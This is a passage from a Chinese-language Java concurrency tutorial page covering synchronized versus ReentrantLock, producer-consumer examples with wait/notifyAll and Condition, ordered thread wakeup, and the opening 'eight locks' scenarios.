<span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">         <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">60</span>; i++) ticket.sale();</span><br><span class="line">      &#125;, <span class="string">&quot;A&quot;</span>).start();</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">         <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">60</span>; i++) ticket.sale();</span><br><span class="line">      &#125;, <span class="string">&quot;B&quot;</span>).start();</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">         <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">60</span>; i++) ticket.sale();</span><br><span class="line">      &#125;, <span class="string">&quot;C&quot;</span>).start();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 资源类OOP</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Ticket</span> &#123;</span><br><span class="line">   <span class="keyword">private</span> <span class="type">int</span> <span class="variable">number</span> <span class="operator">=</span> <span class="number">30</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">sale</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (number &gt; <span class="number">0</span>) &#123;</span><br><span class="line">         System.out.println(Thread.currentThread().getName() + <span class="string">&quot; sales NO.&quot;</span> + (number--) + <span class="string">&quot;，剩余&quot;</span> + number);</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SaleTicketDemo2</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">      <span class="comment">// 并发：多线程操作同一个资源类，把资源类丢入线程</span></span><br><span class="line">      <span class="type">Ticket2</span> <span class="variable">ticket</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Ticket2</span>();</span><br><span class="line"></span><br><span class="line">      <span class="comment">// lambda表达式 ()-&gt;&#123;&#125;</span></span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">         <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">60</span>; i++) ticket.sale();</span><br><span class="line">      &#125;, <span class="string">&quot;A&quot;</span>).start();</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">         <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">60</span>; i++) ticket.sale();</span><br><span class="line">      &#125;, <span class="string">&quot;B&quot;</span>).start();</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">         <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">60</span>; i++) ticket.sale();</span><br><span class="line">      &#125;, <span class="string">&quot;C&quot;</span>).start();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 资源类OOP</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Ticket2</span> &#123;</span><br><span class="line">   <span class="keyword">private</span> <span class="type">int</span> <span class="variable">number</span> <span class="operator">=</span> <span class="number">30</span>;</span><br><span class="line"></span><br><span class="line">   <span class="type">Lock</span> <span class="variable">lock</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReentrantLock</span>();</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sale</span><span class="params">()</span> &#123;</span><br><span class="line">      lock.lock();</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">         <span class="comment">// 业务代码</span></span><br><span class="line">         <span class="keyword">if</span> (number &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            System.out.println(Thread.currentThread().getName() + <span class="string">&quot; sales NO.&quot;</span> + (number--) + <span class="string">&quot;，剩余&quot;</span> + number);</span><br><span class="line">         &#125;</span><br><span class="line">      &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">         e.printStackTrace();</span><br><span class="line">      &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">         lock.unlock();</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>Synchronized是内置Java关键字，Lock是一个Java类。</li><li>Synchronized无法判断获取锁的状态，Lock可以判断是否获取到了锁。</li><li>Synchronized会自动释放锁，Lock必须手动释放锁，如果不释放，<strong>死锁</strong>。</li><li>Synchronized中，线程A获取锁并阻塞，线程B就只能死等。Lock锁就不一定会等待下去。<code>tryLock()</code>。</li><li>Synchronized可重入锁，不可中断的，非公平。Lock，可重入，可判断锁，可设置公平&#x2F;非公平锁。</li><li>Synchronized适合锁少量的代码同步问题，Lock适合锁大量的同步代码。</li></ol><h1 id="生产者和消费者问题"><a href="#生产者和消费者问题" class="headerlink" title="生产者和消费者问题"></a>生产者和消费者问题</h1><p>面试常见：单例模式、排序算法、生产者和消费者、死锁</p><h2 id="synchronized版"><a href="#synchronized版" class="headerlink" title="synchronized版"></a>synchronized版</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 线程之间的通信问题 等待唤醒和通知唤醒</span></span><br><span class="line"><span class="comment"> * 口诀：判断等待，业务，通知。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestNum</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">      <span class="type">Data</span> <span class="variable">data</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Data</span>();</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">         <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">               data.increment();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">               e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;, <span class="string">&quot;A&quot;</span>).start();</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">         <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">               data.decrement();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">               e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;, <span class="string">&quot;B&quot;</span>).start();</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">         <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">               data.increment();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">               e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;, <span class="string">&quot;C&quot;</span>).start();</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">         <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">               data.decrement();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">               e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;, <span class="string">&quot;D&quot;</span>).start();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//数字 资源类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Data</span> &#123;</span><br><span class="line">   <span class="keyword">private</span> <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">increment</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">      <span class="comment">//用while而不是if，防止虚假唤醒问题。</span></span><br><span class="line">      <span class="keyword">while</span> (num != <span class="number">0</span>) &#123;</span><br><span class="line">         <span class="built_in">this</span>.wait();<span class="comment">//wait</span></span><br><span class="line">      &#125;</span><br><span class="line">      num++;</span><br><span class="line">      System.out.println(Thread.currentThread().getName() + <span class="string">&quot;=&gt;&quot;</span> + num);</span><br><span class="line">      <span class="built_in">this</span>.notifyAll();<span class="comment">//通知其他线程</span></span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">decrement</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">      <span class="keyword">while</span> (num == <span class="number">0</span>) &#123;</span><br><span class="line">         <span class="built_in">this</span>.wait();<span class="comment">//wait</span></span><br><span class="line">      &#125;</span><br><span class="line">      num--;</span><br><span class="line">      System.out.println(Thread.currentThread().getName() + <span class="string">&quot;=&gt;&quot;</span> + num);</span><br><span class="line">      <span class="built_in">this</span>.notifyAll();<span class="comment">//通知其他线程</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="JUC版"><a href="#JUC版" class="headerlink" title="JUC版"></a>JUC版</h2><p><code>await()</code>：使当前线程等待，同时释放当前锁，当其他线程中使用signal()时或者signalAll()方法时，线程会重新获得锁并继续执行。或者当线程被中断时，也能跳出等待。该方法和Object的wait()类似。</p><p><code>awaitUninterruptibly()</code>：该方法和await()相同，但是不响应中断。</p><p><code>await(long time, TimeUnit unit)</code>：当前线程等待，直到线程被唤醒或者中断，或者等待时间耗尽，这里第二个参数就是等待时间单位。</p><p><code>awaitNanos(long nanosTimeout</code>：当前线程等待，直到线程被唤醒或者中断，或者等待时间耗尽，等待的时间单位是固定的为纳秒（十亿分之一秒）。</p><p><code>awaitUntil(Date deadline)</code>：前线程等待，直到线程被唤醒或者中断，或者到达具体的截至日期。</p><p><code>signal()</code>：唤醒一个等待的线程。</p><p><code>signalAll()</code>：唤醒所有等待的线程。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestNum2</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">      <span class="type">Data2</span> <span class="variable">data</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Data2</span>();</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">         <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">            data.increment();</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;, <span class="string">&quot;A&quot;</span>).start();</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">         <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">            data.decrement();</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;, <span class="string">&quot;B&quot;</span>).start();</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">         <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">            data.increment();</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;, <span class="string">&quot;C&quot;</span>).start();</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">         <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">            data.decrement();</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;, <span class="string">&quot;D&quot;</span>).start();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//数字 资源类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Data2</span> &#123;</span><br><span class="line">   <span class="keyword">private</span> <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">   <span class="type">Lock</span> <span class="variable">lock</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReentrantLock</span>();</span><br><span class="line">   <span class="type">Condition</span> <span class="variable">condition</span> <span class="operator">=</span> lock.newCondition();</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">increment</span><span class="params">()</span> &#123;</span><br><span class="line">      lock.lock();</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">         <span class="comment">//业务代码</span></span><br><span class="line">         <span class="keyword">while</span> (num != <span class="number">0</span>) &#123;</span><br><span class="line">            condition.await();<span class="comment">//等待</span></span><br><span class="line">         &#125;</span><br><span class="line">         num++;</span><br><span class="line">         System.out.println(Thread.currentThread().getName() + <span class="string">&quot;=&gt;&quot;</span> + num);</span><br><span class="line">         condition.signalAll();<span class="comment">//唤醒全部</span></span><br><span class="line">      &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">         e.printStackTrace();</span><br><span class="line">      &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">         lock.unlock();</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">decrement</span><span class="params">()</span> &#123;</span><br><span class="line">      lock.lock();</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">         <span class="keyword">while</span> (num == <span class="number">0</span>) &#123;</span><br><span class="line">            condition.await();<span class="comment">//等待</span></span><br><span class="line">         &#125;</span><br><span class="line">         num--;</span><br><span class="line">         System.out.println(Thread.currentThread().getName() + <span class="string">&quot;=&gt;&quot;</span> + num);</span><br><span class="line">         condition.signalAll();<span class="comment">//唤醒全部</span></span><br><span class="line">      &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">         e.printStackTrace();</span><br><span class="line">      &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">         lock.unlock();</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.lfalive.top/Learn-java-JUC/TestNum2.JPG"></p><p>问题：线程仍然是随机顺序运行。若想有序执行ABCD，就要使用Condition精准通知和唤醒线程。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestNum3</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">      <span class="type">Data3</span> <span class="variable">data</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Data3</span>();</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">         <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">            data.printA();</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;, <span class="string">&quot;A&quot;</span>).start();</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">         <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">            data.printB();</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;, <span class="string">&quot;B&quot;</span>).start();</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">         <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">            data.printC();</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;, <span class="string">&quot;C&quot;</span>).start();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//A-&gt;B-&gt;C-&gt;A循环唤醒</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Data3</span> &#123;</span><br><span class="line">   <span class="type">Lock</span> <span class="variable">lock</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReentrantLock</span>();</span><br><span class="line">   <span class="type">Condition</span> <span class="variable">condition1</span> <span class="operator">=</span> lock.newCondition();</span><br><span class="line">   <span class="type">Condition</span> <span class="variable">condition2</span> <span class="operator">=</span> lock.newCondition();</span><br><span class="line">   <span class="type">Condition</span> <span class="variable">condition3</span> <span class="operator">=</span> lock.newCondition();</span><br><span class="line">   <span class="keyword">private</span> <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">printA</span><span class="params">()</span> &#123;</span><br><span class="line">      lock.lock();</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">         <span class="keyword">while</span> (num != <span class="number">1</span>) &#123;</span><br><span class="line">            condition1.await();<span class="comment">//等待应该总是出现在循环中，防止虚假唤醒</span></span><br><span class="line">         &#125;</span><br><span class="line">         System.out.println(Thread.currentThread().getName() + <span class="string">&quot;=&gt;&quot;</span> + num);</span><br><span class="line">         num++;</span><br><span class="line">         condition2.signal();<span class="comment">//唤醒指定的线程</span></span><br><span class="line">      &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">         e.printStackTrace();</span><br><span class="line">      &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">         lock.unlock();</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">printB</span><span class="params">()</span> &#123;</span><br><span class="line">      lock.lock();</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">         <span class="keyword">while</span> (num != <span class="number">2</span>) &#123;</span><br><span class="line">            condition2.await();</span><br><span class="line">         &#125;</span><br><span class="line">         System.out.println(Thread.currentThread().getName() + <span class="string">&quot;=&gt;&quot;</span> + num);</span><br><span class="line">         num++;</span><br><span class="line">         condition3.signal();<span class="comment">//唤醒指定的线程</span></span><br><span class="line">      &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">         e.printStackTrace();</span><br><span class="line">      &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">         lock.unlock();</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">printC</span><span class="params">()</span> &#123;</span><br><span class="line">      lock.lock();</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">         <span class="keyword">while</span> (num != <span class="number">3</span>) &#123;</span><br><span class="line">            condition3.await();</span><br><span class="line">         &#125;</span><br><span class="line">         System.out.println(Thread.currentThread().getName() + <span class="string">&quot;=&gt;&quot;</span> + num);</span><br><span class="line">         num = <span class="number">1</span>;</span><br><span class="line">         condition1.signal();<span class="comment">//唤醒指定的线程</span></span><br><span class="line">      &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">         e.printStackTrace();</span><br><span class="line">      &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">         lock.unlock();</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.lfalive.top/Learn-java-JUC/TestNum3.JPG"></p><h1 id="八锁问题"><a href="#八锁问题" class="headerlink" title="八锁问题"></a>八锁问题</h1><p>八锁问题，就是关于锁的八个问题</p><p>参考链接：<a href="https://www.cnblogs.com/itiaotiao/p/12651573.html">经典8锁问题–助你彻底搞懂锁的概念</a></p><h2 id="场景一"><a href="#场景一" class="headerlink" title="场景一"></a>场景一</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 标准情况下 是先sendMsg()　还是先call()?</span></span><br><span class="line"><span class="comment"> * 答案：sendMsg</span></span><br><span class="line"><span class="comment"> * 解释：被 synchronized 修饰的方式，锁的对象是方法的调用者</span></span><br><span class="line"><span class="comment"> * 两个方法调用的对象是同一个，先调用的先执行！</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test1</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">      <span class="type">Phone1</span> <span class="variable">phone</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Phone1</span>();</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">Thread</span>(phone::sendMsg, <span class="string">&quot;A&quot;</span>).start();</span><br><span class="line">      TimeUnit.SECONDS.sleep(<span class="number">3</span>);</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">Thread</span>(phone::call, <span class="string">&quot;B&quot;</span>).start();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Phone1</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">sendMsg</span><span class="params">()</span> &#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;sendMsg&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">call</span><span class="params">()</span> &#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;call&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="场景二"><a href="#场景二" class="headerlink" title="场景二"></a>场景二</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * sendMsg内休眠两秒的情况下 是先sendMsg()　还是先call()?</span></span><br><span class="line"><span class="comment"> * 答案：sendMsg</span></span><br><span class="line"><span class="comment"> * 解释：被 synchronized 修饰的方式，锁的对象是方法的调用者</span></span><br><span class="line"><span class="comment"> * 两个方法调用的对象是同一个，先调用的先执行！</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test2</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">      <span class="type">Phone2</span> <span class="variable">phone</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Phone2</span>();</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">         <span class="keyword">try</span> &#123;</span><br><span class="line">            phone.sendMsg();</span><br><span class="line">         &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;, <span class="string">&quot;A&quot;</span>).start();</span><br><span class="line">      TimeUnit.SECONDS.sleep(<span class="number">2</span>);</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">Thread</span>(phone::call, <span class="string">&quot;B&quot;</span>).start();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Phone2</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">sendMsg</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">      TimeUnit.SECONDS.sleep(<span class="number">3</span>);<span class="comment">//休眠两秒</span></span><br><span class="line">      System.out.println(<span class="string">&quot;sendMsg&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">call</span><span class="params">()</span> &#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;call&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="场景三"><a href="#场景三" class="headerlink" title="场景三"></a>场景三</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 被synchronized修饰的方法和普通方法 是先sendMsg()　还是先call()?</span></span><br><span class="line"><span class="comment"> * 答案：call（普通方法）</span></span><br><span class="line"><span class="comment"> * 解释：普通方法没有 synchronized 修饰，不是同步方法，不受锁的影响！</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test3</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">      <span class="type">Phone3</span> <span class="variable">phone</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Phone3</span>();</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">         <span class="keyword">try</span> &#123;</span><br><span class="line">            phone.sendMsg();</span><br><span class="line">         &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;, <span class="string">&quot;A&quot;</span>).start();</span><br><span class="line">      TimeUnit.SECONDS.sleep(<span class="number">2</span>);</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">Thread</span>(phone::call, <span class="string">&quot;B&quot;</span>).start();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Phone3</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">sendMsg</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">      TimeUnit.SECONDS.sleep(<span class="number">4</span>);<span class="comment">//休眠两秒</span></span><br><span class="line">      System.out.println(<span class="string">&quot;sendMsg&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">call</span><span class="params">()</span> &#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;call&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="场景四"><a href="#场景四" class="headerlink" title="场景四"></a>场景四</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 两个不同的phone对象 先执行sendEmail() 还是callPhone()？</span></span><br><span class="line"><span class="comment"> * 答案：call</span></span><br><span class="line"><span class="comment"> * 解释：被synchronized 修饰的不同方法 锁的对象是调用者</span></span><br><span class="line"><span class="comment"> * 这里锁的是两个对象（两个不同的调用者），所以互不影响，根据延迟得出结果</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test4</span> &#123;</span><br><span class="line"> 